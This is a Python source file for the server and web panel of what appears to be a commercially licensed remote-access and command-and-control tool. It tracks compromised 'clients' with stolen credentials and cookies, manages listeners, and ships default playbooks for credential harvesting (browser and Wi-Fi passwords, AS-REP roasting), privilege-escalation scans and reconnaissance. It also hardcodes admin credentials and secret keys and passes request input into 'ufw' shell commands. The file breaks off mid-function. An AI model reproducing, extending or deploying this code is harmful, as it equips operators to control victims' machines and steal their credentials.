#!/usr/bin/env python3
import os
import sys
import json
import ssl
import time
import socket
import base64
import re
import datetime
import random
import shutil
import psutil
import subprocess
import tempfile
import webbrowser
import asyncio
import requests
import uuid
import ast
import appdirs
import keyword
import logging
from aiohttp import web
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
import token
import tokenize
from io import BytesIO
from functools import wraps
from typing import Dict, Any
from colorama import Fore, Style, init

import croniter
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet

import pyotp
import qrcode
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Quart y utilidades
from quart import Quart, jsonify, request, render_template, session, redirect, url_for, flash, send_file, send_from_directory, Response
from werkzeug.utils import secure_filename
import hypercorn.asyncio
from hypercorn.config import Config as HyperConfig

# Enviar errores a la devnull
sys.stderr = open(os.devnull, 'w')

# Base de datos asíncrona y hashing de contraseñas
import aiosqlite
import bcrypt

# ---------------------------
# DECORADOR LICENCIAS
# ---------------------------
def license_required(f):
    @wraps(f)
    async def decorated_function(*args, **kwargs):
        config = await get_config()
        if config.get("LICENSE_STATUS") != "true":
            return redirect(url_for("license_page"))
        return await f(*args, **kwargs)
    return decorated_function

# ---------------------------
# CONFIGURACIÓN DE LA BASE DE DATOS
# ---------------------------
def get_db_path():
    base_dir = "/var/www/html/artone"
    persistent_path = os.path.join(base_dir, "artone.db")
    
    if getattr(sys, 'frozen', False):
        temp_path = os.path.join(sys._MEIPASS, "artone.db")
        os.makedirs(base_dir, exist_ok=True)
        if not os.path.exists(persistent_path) and os.path.exists(temp_path):
            import shutil
            shutil.copy(temp_path, persistent_path)
    return persistent_path

DB_FILE = get_db_path()

async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        # Tabla de configuración
        await db.execute("""
            CREATE TABLE IF NOT EXISTS config (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        # Tabla para blacklist
        await db.execute("""
            CREATE TABLE IF NOT EXISTS blacklist (
                ip TEXT PRIMARY KEY,
                blocked_at TEXT,
                reason TEXT
            )
        """)
        # Tabla para intentos fallidos
        await db.execute("""
            CREATE TABLE IF NOT EXISTS failed_attempts (
                ip TEXT PRIMARY KEY,
                count INTEGER
            )
        """)
        # Tabla de logs
        await db.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_mac TEXT,
                log_type TEXT,
                command TEXT,
                response TEXT,
                timestamp TEXT
            )
        """)
        # Tabla de clientes
        await db.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id INTEGER,
                ip TEXT,
                info TEXT,
                online INTEGER,
                last_seen TEXT,
                credentials TEXT,
                notes TEXT,
                tags TEXT,
                custom_name TEXT,
                cookie TEXT,
                vs TEXT
            )
        """)
        # Tabla de tickets
        await db.execute("""
            CREATE TABLE IF NOT EXISTS tickets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                server_id TEXT,
                user TEXT,
                asunto TEXT,
                descripcion TEXT,
                estado TEXT,
                notas TEXT,
                fecha_creacion TEXT,
                ultima_actualizacion TEXT
            )
        """)
        # Tabla de mensajes broadcast
        await db.execute("""
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT,
                message TEXT,
                timestamp TEXT
            )
        """)
        # Tabla de listeners
        await db.execute("""
            CREATE TABLE IF NOT EXISTS listeners (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                type TEXT,
                port INTEGER,
                encryption TEXT,
                status TEXT,
                created_at TEXT,
                use_ssl INTEGER DEFAULT 0
            )
        """)
        # Tabla de playbooks
        await db.execute("""
            CREATE TABLE IF NOT EXISTS playbooks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                description TEXT,
                commands TEXT,  -- JSON array of command objects
                schedule TEXT,  -- JSON for scheduling (e.g., cron expression)
                conditions TEXT, -- JSON for conditional execution
                mitre_mappings TEXT, -- JSON array of MITRE ATT&CK TTPs
                created_at TEXT,
                updated_at TEXT,
                author TEXT,
                status TEXT DEFAULT 'Draft'  -- Draft, Active, Archived
            )
        """)
        # Tabla de playbook_executions
        await db.execute("""
            CREATE TABLE IF NOT EXISTS playbook_executions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                playbook_id INTEGER,
                client_id INTEGER,
                status TEXT,  -- Pending, Running, Completed, Failed
                results TEXT, -- JSON array of results
                started_at TEXT,
                completed_at TEXT,
                triggered_by TEXT,  -- Manual, Schedule, System
                FOREIGN KEY (playbook_id) REFERENCES playbooks(id),
                FOREIGN KEY (client_id) REFERENCES clients(id)
            )
        """)
        await db.commit()
        # Insertar configuración por defecto
        default_config = {
            "SERVER_IP": "artone.site",
            "SERVER_PORT": "8443",
            "BUFFER_SIZE": "16384",
            "PANEL_PORT": "4135",
            "USERNAME": "pillow",
            "PASSWORD": bcrypt.hashpw("@goliath4354".encode(), bcrypt.gensalt()).decode(),
            "SERVER_VERSION": "3.2.0",
            "LICENSE": "",
            "LICENSE_STATUS": "false",
            "LICENSE_EXPIRY": "",
            "LICENSE_MANAGER_IP": "51.83.72.254",
            "LICENSE_MANAGER_PORT": "5000",
            "CONNECTION_TIMEOUT": "60",
            "LOG_LEVEL": "info",
            "LOG_TO_FILE": "false",
            "LOG_TO_SYSLOG": "false",
            "LOG_FILE_PATH": "/var/log/art-one.log",
            "MAX_LOG_SIZE": "10",
            "LOG_ENCRYPTION": "false",
            "LOG_ROTATION": "false",
            "PROXY_TYPE": "none",
            "PROXY_HOST": "",
            "PROXY_PORT": "",
            "PROXY_USERNAME": "",
            "PROXY_PASSWORD": "",
            "DNS_SERVER": "8.8.8.8",
            "USE_CUSTOM_DNS": "false",
            "ENABLE_KILLSWITCH": "false",
            "SERVER_PERSISTENCE_METHOD": "none",
            "RESTART_INTERVAL": "60",
            "AUTO_RESTART": "false",
            "HIDE_PROCESS": "false",
            "BLACKLIST_THRESHOLD": "3",
            "AUTO_BLACKLIST": "true",
            "BLOCK_COUNTRY": "false",
            "BLOCKED_COUNTRIES": ""
        }
        for key, value in default_config.items():
            async with db.execute("SELECT value FROM config WHERE key = ?", (key,)) as cursor:
                row = await cursor.fetchone()
            if row is None:
                await db.execute("INSERT INTO config (key, value) VALUES (?, ?)", (key, value))
        await db.commit()
        # Insertar playbooks por defecto
        default_playbooks = [
            {
                "name": "network_recon",
                "description": "Perform comprehensive network reconnaissance",
                "commands": json.dumps([
                    {"type": "predefined", "value": "network_info", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "open_ports", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "arp_table", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "dns_cache", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "network_connections", "parameters": {}, "condition": {}}
                ]),
                "schedule": json.dumps({}),
                "conditions": json.dumps({}),
                "mitre_mappings": json.dumps(["T1016", "T1046", "T1082"]),
                "created_at": time.strftime('%Y-%m-%d %H:%M:%S'),
                "updated_at": time.strftime('%Y-%m-%d %H:%M:%S'),
                "author": "System",
                "status": "Active"
            },
            {
                "name": "privesc_scan",
                "description": "Scan for privilege escalation opportunities",
                "commands": json.dumps([
                    {"type": "predefined", "value": "check_admin", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "check_permissions", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "unquoted_path", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "always_install_elevated", "parameters": {}, "condition": {}}
                ]),
                "schedule": json.dumps({}),
                "conditions": json.dumps({}),
                "mitre_mappings": json.dumps(["T1068", "T1134"]),
                "created_at": time.strftime('%Y-%m-%d %H:%M:%S'),
                "updated_at": time.strftime('%Y-%m-%d %H:%M:%S'),
                "author": "System",
                "status": "Active"
            },
            {
                "name": "credential_harvest",
                "description": "Harvest credentials from the system",
                "commands": json.dumps([
                    {"type": "predefined", "value": "wifi_passwords", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "browser_passwords", "parameters": {}, "condition": {}},
                    {"type": "predefined", "value": "ASREP", "parameters": {}, "condition": {}}
                ]),
                "schedule": json.dumps({}),
                "conditions": json.dumps({}),
                "mitre_mappings": json.dumps(["T1003", "T1555"]),
                "created_at": time.strftime('%Y-%m-%d %H:%M:%S'),
                "updated_at": time.strftime('%Y-%m-%d %H:%M:%S'),
                "author": "System",
                "status": "Active"
            }
        ]
        for playbook in default_playbooks:
            async with db.execute("SELECT id FROM playbooks WHERE name = ?", (playbook["name"],)) as cursor:
                row = await cursor.fetchone()
            if row is None:
                await db.execute(
                    """
                    INSERT INTO playbooks (name, description, commands, schedule, conditions, mitre_mappings, created_at, updated_at, author, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                    (
                        playbook["name"],
                        playbook["description"],
                        playbook["commands"],
                        playbook["schedule"],
                        playbook["conditions"],
                        playbook["mitre_mappings"],
                        playbook["created_at"],
                        playbook["updated_at"],
                        playbook["author"],
                        playbook["status"]
                    )
                )
        await db.commit()

async def get_config() -> Dict[str, str]:
    config = {}
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT key, value FROM config") as cursor:
            async for row in cursor:
                config[row[0]] = row[1]
    return config

async def set_config(new_config: Dict[str, str]):
    async with aiosqlite.connect(DB_FILE) as db:
        for key, value in new_config.items():
            await db.execute("REPLACE INTO config (key, value) VALUES (?, ?)", (key, value))
        await db.commit()

# ---------------------------
# UTILIDADES PARA CONTRASEÑAS
# ---------------------------
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()

def check_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode(), hashed.encode())

# ---------------------------
# UTILIDADES DE BLACKLIST Y FALLBACK
# ---------------------------
async def get_blacklist() -> Dict[str, Dict[str, str]]:
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT ip, blocked_at, reason FROM blacklist") as cursor:
            rows = await cursor.fetchall()
    return {row[0]: {"blocked_at": row[1], "reason": row[2]} for row in rows}

async def add_blacklist(ip: str, reason: str):
    blocked_at = time.strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("REPLACE INTO blacklist (ip, blocked_at, reason) VALUES (?, ?, ?)", (ip, blocked_at, reason))
        await db.commit()

async def remove_blacklist(ip: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("DELETE FROM blacklist WHERE ip = ?", (ip,))
        await db.commit()

async def get_failed_attempts() -> Dict[str, int]:
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT ip, count FROM failed_attempts") as cursor:
            rows = await cursor.fetchall()
    return {row[0]: row[1] for row in rows}

async def set_failed_attempt(ip: str, count: int):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("REPLACE INTO failed_attempts (ip, count) VALUES (?, ?)", (ip, count))
        await db.commit()

async def reset_failed_attempt(ip: str):
    await set_failed_attempt(ip, 0)

# ---------------------------
# UTILIDADES DE LOGS
# ---------------------------
# Configurar logging
logging.basicConfig(
    level=logging.DEBUG,
    filename='/var/www/html/artone/artone.log',
    format='%(asctime)s %(levelname)s: %(message)s'
)

async def insert_log(log_type: str, client_mac: str, command: str, response: str):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT INTO logs (client_mac, log_type, command, response, timestamp) VALUES (?, ?, ?, ?, ?)",
            (client_mac, log_type, command, response, timestamp)
        )
        await db.commit()

async def get_logs() -> Dict[str, Any]:
    logs_data = {"general": [], "clients": {}}
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT command, response, timestamp FROM logs WHERE log_type = 'general' ORDER BY id DESC") as cursor:
            async for row in cursor:
                logs_data["general"].append(f"[{row[2]}] {row[0]} {row[1]}")
        async with db.execute("SELECT client_mac, command, response, timestamp FROM logs WHERE log_type = 'client' ORDER BY id DESC") as cursor:
            async for row in cursor:
                mac = row[0]
                if mac not in logs_data["clients"]:
                    logs_data["clients"][mac] = {"info": {}, "commands": []}
                logs_data["clients"][mac]["commands"].append({
                    "command": row[1],
                    "response": row[2],
                    "timestamp": row[3]
                })
        async with db.execute("SELECT ip, info FROM clients") as cursor:
            async for row in cursor:
                try:
                    client_info = json.loads(row[1])
                except:
                    client_info = {}
                mac = client_info.get("MDRS", "Unknown MAC")
                if mac in logs_data["clients"]:
                    logs_data["clients"][mac]["info"] = {
                        "HSTN": client_info.get("HSTN", "Unknown Host"),
                        "PPI": client_info.get("PPI", "Unknown IP"),
                        "LPI": client_info.get("LPI", "Unknown Local IP")
                    }
    return logs_data

# ---------------------------
# UTILIDADES DE CLIENTES
# ---------------------------
async def insert_or_update_client(client_id: int, ip: str, info: dict, online: bool):
    now = time.strftime('%Y-%m-%d %H:%M:%S')
    info_json = json.dumps(info)
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT id FROM clients WHERE client_id = ?", (client_id,)) as cursor:
            row = await cursor.fetchone()
        if row is None:
            await db.execute(
                "INSERT INTO clients (client_id, ip, info, online, last_seen, credentials, notes, tags, vs) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (client_id, ip, info_json, int(online), now, "", "", "", info.get("vs", ""))
            )
        else:
            await db.execute(
                "UPDATE clients SET ip = ?, info = ?, online = ?, last_seen = ?, vs = ? WHERE client_id = ?",
                (ip, info_json, int(online), now, info.get("vs", ""), client_id)
            )
        await db.commit()

async def get_clients() -> list:
    clients = []
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT client_id, ip, info, online, last_seen, credentials, notes, tags, custom_name, cookie, vs FROM clients") as cursor:
            async for row in cursor:
                try:
                    info = json.loads(row[2])
                except:
                    info = {}
                clients.append({
                    "id": row[0],
                    "address": row[1],
                    "info": info,
                    "status": "Online" if row[3] else "Offline",
                    "last_seen": row[4],
                    "credentials": row[5],
                    "notes": row[6],
                    "tags": row[7],
                    "custom_name": row[8] if row[8] else f"Client #{row[0]}",
                    "cookie": row[9],
                    "version": row[10]
                })
    return clients

async def update_client_fields(client_id: int, credentials: str = None, notes: str = None, tags: str = None, custom_name: str = None, cookie: str = None):
    async with aiosqlite.connect(DB_FILE) as db:
        updates = []
        params = []
        if credentials is not None:
            updates.append("credentials = ?")
            params.append(credentials)
        if notes is not None:
            updates.append("notes = ?")
            params.append(notes)
        if tags is not None:
            updates.append("tags = ?")
            params.append(tags)
        if custom_name is not None:
            updates.append("custom_name = ?")
            params.append(custom_name)
        if cookie is not None:
            updates.append("cookie = ?")
            params.append(cookie)
        if updates:
            params.append(client_id)
            query = f"UPDATE clients SET {', '.join(updates)} WHERE client_id = ?"
            await db.execute(query, params)
            await db.commit()

# ---------------------------
# UTILIDADES DE LISTENERS
# ---------------------------
async def insert_listener(name: str, listener_type: str, port: int, encryption: str, use_ssl: bool = False):
    created_at = time.strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT INTO listeners (name, type, port, encryption, status, created_at, use_ssl) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (name, listener_type, port, encryption, "Active", created_at, int(use_ssl))
        )
        await db.commit()

async def get_listeners() -> list:
    listeners = []
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT name, type, port, encryption, status, created_at, use_ssl FROM listeners") as cursor:
            async for row in cursor:
                listeners.append({
                    "name": row[0],
                    "type": row[1],
                    "port": row[2],
                    "encryption": row[3],
                    "status": row[4],
                    "created_at": row[5],
                    "use_ssl": bool(row[6])
                })
    return listeners

async def update_listener_status(name: str, status: str):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("UPDATE listeners SET status = ? WHERE name = ?", (status, name))
        await db.commit()

# ---------------------------
# UTILIDADES DE PLAYBOOKS
# ---------------------------
async def get_playbook(playbook_id: int) -> dict:
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT id, name, description, commands, created_at FROM playbooks WHERE id = ?", (playbook_id,)) as cursor:
            row = await cursor.fetchone()
            if row:
                return {
                    "id": row[0],
                    "name": row[1],
                    "description": row[2],
                    "commands": json.loads(row[3]),
                    "created_at": row[4]
                }
    return None

# ---------------------------
# CONFIGURACIÓN INICIAL
# ---------------------------
init()
app = Quart(__name__)
app.secret_key = "jsR0$-_SncDasSj$@7Fp8Qjc@3WkcA_8OiP"
SECRET_RESET_KEY = "AWEWCg1ze?5v1051gr05_asg54@sd4f$s45s4a1"
LAST_NET = None
LAST_TIME = None

# Ruta para mostrar la página de licencia
@app.route("/license", methods=["GET"])
async def license_page():
    return await render_template("license.html")

@app.route("/api/get_mac", methods=["GET"])
async def get_mac():
    try:
        mac = get_mac_address()
        return jsonify({"mac": mac})
    except Exception as e:
        return jsonify({"error": f"No se pudo obtener la MAC: {str(e)}"}), 500
    
@app.context_processor
def inject_panel_port():
    return {"panel_port": (asyncio.run(get_config())).get("PANEL_PORT", "4135")}

@app.context_processor
def inject_domain():
    config = asyncio.run(get_config())
    domain = config.get("SERVER_IP", "art-one.site")
    return dict(domain=domain)

def login_required(f):
    @wraps(f)
    async def decorated_function(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return await f(*args, **kwargs)
    return decorated_function

def get_mac_address():
    mac_int = uuid.getnode()
    mac_str = ':'.join(('%012X' % mac_int)[i:i+2] for i in range(0, 12, 2))
    return mac_str.lower()

# ---------------------------
# RUTAS DE AUTENTICACIÓN
# ---------------------------
@app.route("/login", methods=["GET", "POST"])
@license_required
async def login():
    config = await get_config()
    two_fa_enabled = (config.get("2FA_ENABLED") == "true")
    
    if request.method == "GET":
        return await render_template("login.html", two_fa_enabled=two_fa_enabled)
    
    ip = request.remote_addr
    blacklist = await get_blacklist()
    if ip in blacklist:
        print(f"[!] Blacklisted IP: {ip} login blocked")
        return "Forbidden", 403

    if request.method == "POST":
        form = await request.form
        username = form.get("username")
        password = form.get("password")
        totp_code = form.get("totp_code")
        if username == config.get("USERNAME") and check_password(password, config.get("PASSWORD")):
            if two_fa_enabled:
                if not totp_code:
                    await flash("2FA code is required.", "danger")
                    return redirect(url_for("login"))
                secret = config.get("2FA_SECRET")
                totp = pyotp.TOTP(secret)
                if not totp.verify(totp_code):
                    await flash("Invalid 2FA code.", "danger")
                    return redirect(url_for("login"))
            session["logged_in"] = True
            await reset_failed_attempt(ip)
            await flash("Login successful!", "success")
            return redirect(url_for("index"))
        else:
            attempts = await get_failed_attempts()
            count = attempts.get(ip, 0) + 1
            await set_failed_attempt(ip, count)
            if count >= 3:
                print(f"[!] IP {ip} added to blacklist due to repeated failed login attempts")
                await add_blacklist(ip, "3 failed login attempts")
                await reset_failed_attempt(ip)
                return "Forbidden", 403
            await flash("Invalid credentials, please try again.", "danger")
            return redirect(url_for("login"))
    
    return await render_template("login.html", two_fa_enabled=two_fa_enabled)

@app.route("/logout")
@license_required
@login_required
async def logout():
    session.pop("logged_in", None)
    await flash("You have been logged out.", "info")
    session.clear()
    return redirect(url_for("login"))

@app.route("/source/<path:filename>")
async def serve_source(filename):
    return await send_from_directory('source', filename)

@app.errorhandler(404)
async def page_not_found(e):
    ip = request.remote_addr
    blacklist = await get_blacklist()
    if ip in blacklist:
        return "Forbidden", 403
    return "Not found", 404

@app.route("/blacklist", methods=["GET"])
@license_required
@login_required
async def blacklist_route():
    bl = await get_blacklist()
    return jsonify({"blacklist": bl})

@app.route("/add_to_blacklist", methods=["POST"])
@license_required
@login_required
async def add_to_blacklist_route():
    data = await request.get_json()
    ip = data.get("ip")
    if not ip:
        return jsonify({"error": "No IP provided"}), 400
    current_bl = await get_blacklist()
    if ip in current_bl:
        return jsonify({"error": f"IP {ip} is already in the blacklist"}), 400
    await add_blacklist(ip, "Manually added by admin")
    await reset_failed_attempt(ip)
    try:
        cmd = f"ufw deny from {ip}"
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        return jsonify({"error": f"Could not block IP {ip} at system level: {e}"}), 500
    return jsonify({"success": f"IP {ip} has been added to the blacklist"}), 200

@app.route("/unblock_ip", methods=["POST"])
@license_required
@login_required
async def unblock_ip():
    data = await request.get_json()
    ip = data.get("ip")
    if not ip:
        return jsonify({"error": "No IP provided"}), 400
    current_bl = await get_blacklist()
    if ip not in current_bl:
        return jsonify({"error": f"IP {ip} is not in the blacklist"}), 404
    await remove_blacklist(ip)
    await reset_failed_attempt(ip)
    try:
        cmd = f"ufw delete deny from {ip}"
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        return jsonify({"error": f"Could not unblock IP {ip} at system level: {e}"}), 500
    return jsonify({"success": f"IP {ip} has been removed from the blacklist and failed attempts reset."}), 200

# ---------------------------
# RUTAS DE TICKETS
# ---------------------------
@app.route("/ticket/new", methods=["GET", "POST"])
@license_required
async def new_ticket():
    if request.method == "POST":
        form = await request.form
        user = form.get("user", "Anónimo")
        asunto = form.get("asunto")
        descripcion = form.get("descripcion")
        estado = "Abierto"
        fecha = time.strftime('%Y-%m-%d %H:%M:%S')
        async with aiosqlite.connect(DB_FILE) as db:
            await db.execute(
                "INSERT INTO tickets (user, asunto, descripcion, estado, fecha_creacion, ultima_actualizacion) VALUES (?, ?, ?, ?, ?, ?)",
                (user, asunto, descripcion, estado, fecha, fecha)
            )
            await db.commit()
        return redirect(url_for("view_tickets"))
    return await render_template("new_ticket.html")

@app.route("/tickets", methods=["GET", "POST"])
@license_required
async def tickets_page():
    if request.method == "POST":
        form = await request.form
        user = form.get("user", "Anónimo")
        asunto = form.get("asunto")
        descripcion = form.get("descripcion")
        estado = "Abierto"
        notas = form.get("notas", "")
        fecha = time.strftime('%Y-%m-%d %H:%M:%S')
        try:
            public_ip = subprocess.check_output("curl -s ifconfig.me", shell=True, text=True).strip()
        except:
            public_ip = "unknown"
        server_id = public_ip
        async with aiosqlite.connect(DB_FILE) as db:
            await db.execute(
                "INSERT INTO tickets (server_id, user, asunto, descripcion, estado, notas, fecha_creacion, ultima_actualizacion) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (server_id, user, asunto, descripcion, estado, notas, fecha, fecha)
            )
            await db.commit()
        try:
            ticket_data = {
                "server_id": server_id,
                "user": user,
                "asunto": asunto,
                "descripcion": descripcion,
                "estado": estado,
                "notas": notas,
                "fecha_creacion": fecha,
                "ultima_actualizacion": fecha
            }
            lm_base_url = await get_license_manager_base_url()
            license_manager_url = f"{lm_base_url}/api/ticket/new"
            requests.post(license_manager_url, json=ticket_data, verify=False, timeout=5)
        except Exception as e:
            print(f"Error al reenviar el ticket al License Manager: {e}")
        return redirect(url_for("tickets_page"))
    
    tickets = []
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute(
            "SELECT id, server_id, user, asunto, estado, notas, fecha_creacion, ultima_actualizacion FROM tickets ORDER BY id DESC"
        ) as cursor:
            async for row in cursor:
                tickets.append({
                    "id": row[0],
                    "server_id": row[1],
                    "user": row[2],
                    "asunto": row[3],
                    "estado": row[4],
                    "notas": row[5],
                    "fecha_creacion": row[6],
                    "ultima_actualizacion": row[7]
                })
    return await render_template("tickets.html", tickets=tickets)

@app.route("/ticket/<int:ticket_id>/update", methods=["POST"])
@license_required
@login_required
async def update_ticket(ticket_id):
    data = await request.get_json()
    nuevo_estado = data.get("estado")
    notas = data.get("notas", "")
    if not nuevo_estado:
        return jsonify({"error": "Estado no proporcionado"}), 400
    fecha = time.strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "UPDATE tickets SET estado = ?, notas = ?, ultima_actualizacion = ? WHERE id = ?",
            (nuevo_estado, notas, fecha, ticket_id)
        )
        await db.commit()
    return jsonify({"success": True, "nuevo_estado": nuevo_estado})

@app.route("/ticket/<int:ticket_id>/sync", methods=["POST"])
@license_required
async def sync_ticket(ticket_id):
    data = await request.get_json()
    nuevo_estado = data.get("estado")
    notas = data.get("notas", "")
    ultima_actualizacion = data.get("ultima_actualizacion")
    if not nuevo_estado or not ultima_actualizacion:
        return jsonify({"error": "Faltan datos"}), 400
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "UPDATE tickets SET estado = ?, notas = ?, ultima_actualizacion = ? WHERE id = ?",
            (nuevo_estado, notas, ultima_actualizacion, ticket_id)
        )
        await db.commit()
    return jsonify({"success": True})

# ---------------------------
# RUTAS DE BROADCAST
# ---------------------------
@app.route("/receive_broadcast", methods=["POST"])
@license_required
async def receive_broadcast():
    data = await request.get_json()
    title = data.get("title")
    message = data.get("message")
    timestamp = data.get("timestamp")
    if not title or not message or not timestamp:
        return jsonify({"error": "Invalid message format"}), 400
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("INSERT INTO messages (title, message, timestamp) VALUES (?, ?, ?)", (title, message, timestamp))
        await db.commit()
    return jsonify({"success": True})

@app.route("/messages", methods=["GET"])
@license_required
async def get_messages():
    messages = []
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT id, title, message, timestamp FROM messages ORDER BY id DESC") as cursor:
            async for row in cursor:
                messages.append({
                    "id": row[0],
                    "title": row[1],
                    "message": row[2],
                    "timestamp": row[3]
                })
    return jsonify(messages)

@app.route("/delete_message/<int:message_id>", methods=["POST"])
@license_required
async def delete_message(message_id):
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("DELETE FROM messages WHERE id = ?", (message_id,))
        await db.commit()
    return jsonify({"success": True})

# ---------------------------
# RUTAS DE CONFIGURACIÓN / ADMIN
# ---------------------------
class ClientSession:
    def __init__(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, id: int):
        self.id = id
        self.reader = reader
        self.writer = writer
        self.info = {}
        self.online = True
        self.commands_queue = asyncio.Queue()
        self.address = writer.get_extra_info("peername")
        self.read_lock = asyncio.Lock()
        self.write_lock = asyncio.Lock()
    
    def __repr__(self):
        return f"<ClientSession id={self.id} address={self.address} online={self.online}>"
    
@app.route("/config", methods=["GET"])
@license_required
@login_required
async def config_page():
    config = await get_config()
    two_fa_enabled = (config.get("2FA_ENABLED") == "true")
    try:
        public_ip = subprocess.check_output("curl -s ifconfig.me", shell=True, text=True).strip()
    except:
        public_ip = "Unknown"
    return await render_template(
        "config.html",
        server_ip=config.get("SERVER_IP"),
        server_port=config.get("SERVER_PORT"),
        buffer_size=config.get("BUFFER_SIZE"),
        panel_port=config.get("PANEL_PORT"),
        public_ip=public_ip,
        server_version=config.get("SERVER_VERSION"),
        license_status=config.get("LICENSE_STATUS", "false"),
        license_expiry=config.get("LICENSE_EXPIRY", ""),
        two_fa_enabled=two_fa_enabled
    )

@app.route("/config/server", methods=["POST"])
@license_required
@login_required
async def update_server_config():
    config = await get_config()
    form = await request.form
    server_port = form.get("server_port")
    buffer_size = form.get("buffer_size")
    panel_port = form.get("panel_port")
    try:
        if server_port:
            config["SERVER_PORT"] = str(int(server_port))
        if buffer_size:
            config["BUFFER_SIZE"] = str(int(buffer_size))
        if panel_port:
            config["PANEL_PORT"] = str(int(panel_port))
        await set_config(config)
        await flash("Configuración del servidor actualizada exitosamente.", "success")
        await register_self()
        await restart_server()
    except Exception as e:
        await flash(f"Error al actualizar la configuración del servidor: {e}", "danger")
    return redirect(url_for("config_page"))

@app.route("/config/credentials", methods=["POST"])
@license_required
@login_required
async def update_credentials():
    config = await get_config()
    form = await request.form
    current_password = form.get("current_password")
    new_username = form.get("username")
    new_password = form.get("new_password")
    confirm_password = form.get("confirm_password")
    try:
        if not current_password:
            await flash("La contraseña actual es requerida para cambiar las credenciales.", "danger")
            return redirect(url_for("config_page"))
        if not check_password(current_password, config.get("PASSWORD")):
            await flash("La contraseña actual es incorrecta.", "danger")
            return redirect(url_for("config_page"))
        if new_password != confirm_password:
            await flash("Las nuevas contraseñas no coinciden.", "danger")
            return redirect(url_for("config_page"))
        config["USERNAME"] = new_username
        config["PASSWORD"] = hash_password(new_password)
        await set_config(config)
        await flash("Credenciales actualizadas exitosamente.", "success")
    except Exception as e:
        await flash(f"Error al actualizar las credenciales: {e}", "danger")
    return redirect(url_for("config_page"))

@app.route("/config/license", methods=["POST"])
@login_required
async def update_license_config():
    config = await get_config()
    form = await request.form
    license_key = form.get("license_key", "").strip()
    try:
        if license_key:
            valid, lic_data = verify_license(license_key)
            if valid:
                config["LICENSE"] = license_key
                config["LICENSE_STATUS"] = "true"
                config["LICENSE_EXPIRY"] = lic_data.get("expiry", "")
                await flash(f"Licencia válida hasta {lic_data.get('expiry')}.", "success")
            else:
                config["LICENSE"] = ""
                config["LICENSE_STATUS"] = "false"
                config["LICENSE_EXPIRY"] = ""
                await flash(f"Licencia inválida: {lic_data.get('error')}", "danger")
        else:
            await flash("No se ingresó ninguna licencia.", "warning")
        await set_config(config)
    except Exception as e:
        await flash(f"Error al actualizar la licencia: {e}", "danger")
    return redirect(url_for("config_page"))

@app.route("/api/license_update", methods=["POST"])
async def license_update():
    data = await request.get_json()
    license_key = data.get("license_key")
    action = data.get("action")

    config = await get_config()
    current_license = config.get("LICENSE")

    if current_license != license_key:
        return jsonify({"success": False, "message": "License key does not match"}), 400

    if action == "revoke" or action == "delete":
